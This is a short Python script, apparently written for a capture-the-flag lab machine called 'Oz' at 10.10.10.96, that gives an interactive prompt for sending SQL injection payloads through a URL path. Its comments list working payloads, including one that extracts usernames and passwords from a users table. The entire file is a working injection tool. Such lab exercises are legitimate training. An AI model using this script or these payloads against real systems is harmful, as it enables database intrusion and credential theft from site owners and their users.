# This script allows to send SQL injection commands to the Oz box
# Examples:
#           > union select user()
#           > or 1=1 limit 2,1
#           > union select (select concat(username,":",password) from ozdb.users_gbw limit 0,1)

from cmd import Cmd
import requests

class Terminal(Cmd):
    prompt = '> '

    def default(self, args):
        r = requests.get(f"""http://10.10.10.96/users/notexisting'{args}-- -""")
        print(r.text)

terminal = Terminal()
terminal.cmdloop()
